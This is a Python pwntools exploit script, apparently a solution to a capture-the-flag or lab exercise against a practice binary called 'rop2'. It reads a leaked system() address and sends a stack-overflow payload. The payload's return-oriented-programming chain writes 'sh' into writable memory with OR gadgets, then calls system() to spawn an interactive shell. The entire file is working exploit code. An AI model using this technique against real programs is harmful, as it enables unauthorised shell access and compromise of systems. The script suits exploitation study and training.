#!/bin/python

from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']

io = gdb.debug('./rop2', gdbscript = '''
    b main
    c
        ''')
#io = process('./rop2');

POP_RDI_ADDR = 0x4011cd

OR_GADGET_ADDR = 0x401441;

POP_R13_POP_R14_POP_R15_ADDR = 0x4011c8;

RW_ADDR = 0x404000 + 0x800;


io.recvuntil('System address: ');
buffor = io.recvline().decode('ASCII');

system_address = int(buffor, 16);


log.info("System address: " + buffor);


io.sendline(
        b'A' * 16 +
        b'B' * 8 +
        
        # s
        p64(POP_R13_POP_R14_POP_R15_ADDR) +
        p64(RW_ADDR + 0x4a) +
        p64(ord('s')) +
        p64(0xdeadbeefcafebabe) +
        p64(OR_GADGET_ADDR) +

        # h
        p64(POP_R13_POP_R14_POP_R15_ADDR) +
        p64(RW_ADDR + 0x4a + 1) +
        p64(ord('h')) +
        p64(0xdeadbeefcafebabe) +
        p64(OR_GADGET_ADDR) +
    
        p64(POP_RDI_ADDR) +
        p64(RW_ADDR) +

        p64(system_address)
    )

io.interactive()
